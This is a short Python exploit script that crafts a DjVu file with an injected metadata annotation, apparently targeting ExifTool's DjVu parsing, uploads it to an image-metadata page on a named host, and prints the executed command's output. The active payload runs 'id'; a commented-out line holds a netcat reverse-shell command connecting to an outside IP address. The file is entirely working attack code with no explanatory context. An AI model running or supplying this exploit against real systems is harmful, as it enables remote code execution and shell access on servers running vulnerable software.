#!/usr/bin/env python3

import requests
import os

payload = "id"
#payload = "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 140.113.24.143 4444 >/tmp/f"
exploit = """(metadata "\c${{system('{}')}};")""".format(payload)

f = open("exploit", "w")
f.write(exploit)
f.close()
os.system("djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit")

#url = "https://ruthless.monster/exif/index.php"
url = "https://second.ruthless.monster/exif/index.php"

files = {"fileToUpload": ("exploit.djvu", open("exploit.djvu", "rb"), "application/octet-stream")}

r = requests.post(url, files=files)

rce = r.text.split("The file has been uploaded.")[1].split("ExifTool Version Number")[0]
print(rce)
